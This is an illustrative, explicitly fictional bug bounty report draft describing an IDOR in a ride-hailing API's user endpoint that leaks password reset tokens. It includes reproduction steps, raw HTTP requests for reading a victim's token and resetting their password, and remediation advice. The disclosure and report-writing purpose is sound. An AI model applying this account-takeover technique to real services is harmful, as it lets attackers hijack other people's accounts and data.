# Report Draft — F001

> ILLUSTRATIVE EXAMPLE — fictional target, invented data, not a real submission.
> This is the report drafted from `EXAMPLE-finding.md`, written to pass the eight-point check in
> `framework/report-style-guide.md`: plain words, no filler, no emoji, bold only where it means
> something. Read the two side by side to see how the lab notebook becomes a submission.

Platform: hackerone
Program / asset: meridian (example) — `api.meridianride.example`
Submitted: 2026-09-23   Internal ref: F001

---

## Title

IDOR in GET /v2/users/{id} exposes any user's password reset token, allowing account takeover

## Severity

CVSS 3.1: `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` — 9.1, Critical
CWE: CWE-639

Critical because any logged-in user can take over any other account with two requests and no
interaction from the victim. Not lower, because the exposed reset token grants a full password change,
not just data disclosure. Not higher, because it needs an authenticated account and does not affect
availability.

## Summary

The endpoint `GET /v2/users/{id}` returns the complete stored record for any user id, including a live
`password_reset_token`. It does not check that the requested id belongs to the caller. An attacker
reads a victim's token from this endpoint, submits it to the public password reset flow, and sets a new
password for the victim's account. This works for any user id.

## Steps to reproduce

Accounts (both controlled by me, registered for this test):
- Attacker: `hunter+atk@example.com` (id 50231)
- Victim: `hunter+vic@example.com` (id 50232)

1. Log in as the attacker.
2. Send `GET /v2/users/50232` with the attacker's session. The response body contains the victim's
   `password_reset_token`.
3. Send that token to the public reset flow: `POST /auth/reset/confirm` with the token and a new
   password.
4. Log in at `meridianride.example` as `hunter+vic@example.com` with the new password. It succeeds.

## Proof of concept

Read the victim's record with the attacker's own session:
```http
GET /v2/users/50232 HTTP/1.1
Host: api.meridianride.example
Cookie: session=<attacker session>
```
```http
HTTP/1.1 200 OK
Content-Type: application/json

{ "id": 50232, "email": "hunter+vic@example.com",
  "password_reset_token": "rt_9f2c...redacted...", ... }
```

Complete the takeover with the leaked token:
```http
POST /auth/reset/confirm HTTP/1.1
Host: meridianride.example
Content-Type: application/json

{ "token": "rt_9f2c...redacted...", "password": "<new password>" }
```
Response: `200 OK`, `{ "status": "password_updated" }`. The next login as the victim with that
password succeeds.

Attached: screenshots of the profile response and the reset confirmation, and a short recording of the
login as the victim. All media is private to this report.

## Impact

Any authenticated user can take over any account. The attacker needs only the target's user id, which
is sequential and returned throughout the app. Once in, they have the victim's ride history, saved
payment methods, and profile, and can lock the real owner out. Because the id space is enumerable, this
extends to every user, not a chosen one.

## Remediation

Two fixes, both needed. First, `GET /v2/users/{id}` must return a record only when `id` matches the
authenticated user, or reject the request otherwise — apply the same owner check the `/rides` route
already uses. Second, remove `password_reset_token` and other secret fields from the user serializer so
they are never returned by any endpoint. The token check alone is not enough; the field should not be
serialized at all.

---

## Internal tracking (not submitted)

| | |
|--|--|
| Finding file | `examples/EXAMPLE-finding.md` |
| Status | Example — not submitted |
| Reward | — |
| Triage notes | — |
| Lesson | The severity lives in the second field of the response, not the IDOR itself — always read the whole body. |
